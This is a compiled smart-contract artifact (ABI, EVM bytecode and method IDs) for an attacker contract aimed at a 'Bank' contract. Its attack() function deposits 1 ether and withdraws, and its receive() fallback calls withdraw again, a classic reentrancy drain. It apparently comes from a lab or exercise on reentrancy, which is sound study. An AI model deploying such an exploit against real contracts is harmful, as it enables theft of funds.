{"abi":[{"type":"constructor","inputs":[{"name":"_bank","type":"address","internalType":"contract Bank"}],"stateMutability":"nonpayable"},{"type":"receive","stateMutability":"payable"},{"type":"function","name":"attack","inputs":[],"outputs":[],"stateMutability":"payable"},{"type":"function","name":"bank","inputs":[],"outputs":[{"name":"","type":"address","internalType":"contract Bank"}],"stateMutability":"view"},{"type":"function","name":"getBalance","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"}],"bytecode":{"object":"0x608060405234801561000f575f5ffd5b50604051610568380380610568833981810160405281019061003191906100e5565b805f5f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610110565b5f5ffd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6100a38261007a565b9050919050565b5f6100b482610099565b9050919050565b6100c4816100aa565b81146100ce575f5ffd5b50565b5f815190506100df816100bb565b92915050565b5f602082840312156100fa576100f9610076565b5b5f610107848285016100d1565b91505092915050565b61044b8061011d5f395ff3fe608060405260043610610037575f3560e01c806312065fe01461010457806376cdb03b1461012e5780639e5faafc1461015857610100565b3661010057670de0b6b3a76400005f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1631106100fe575f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b81526004015f604051808303815f87803b1580156100e7575f5ffd5b505af11580156100f9573d5f5f3e3d5ffd5b505050505b005b5f5ffd5b34801561010f575f5ffd5b50610118610162565b60405161012591906102f1565b60405180910390f35b348015610139575f5ffd5b50610142610169565b60405161014f9190610384565b60405180910390f35b61016061018d565b005b5f47905090565b5f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b670de0b6b3a764000034146101d7576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016101ce906103f7565b60405180910390fd5b5f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db0670de0b6b3a76400006040518263ffffffff1660e01b81526004015f604051808303818588803b158015610245575f5ffd5b505af1158015610257573d5f5f3e3d5ffd5b50505050505f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b81526004015f604051808303815f87803b1580156102c1575f5ffd5b505af11580156102d3573d5f5f3e3d5ffd5b50505050565b5f819050919050565b6102eb816102d9565b82525050565b5f6020820190506103045f8301846102e2565b92915050565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f819050919050565b5f61034c6103476103428461030a565b610329565b61030a565b9050919050565b5f61035d82610332565b9050919050565b5f61036e82610353565b9050919050565b61037e81610364565b82525050565b5f6020820190506103975f830184610375565b92915050565b5f82825260208201905092915050565b7f52657175697265203120457468657220746f2061747461636b000000000000005f82015250565b5f6103e160198361039d565b91506103ec826103ad565b602082019050919050565b5f6020820190508181035f83015261040e816103d5565b905091905056fea2646970667358221220e22a87379a4b0b6bc8f4f52ee52cd800b725879f103bf81434d5459d9e2ab9c964736f6c63430008220033","linkReferences":{}},"methodIdentifiers":{"attack()":"9e5faafc","bank()":"76cdb03b","getBalance()":"12065fe0"},"id":121}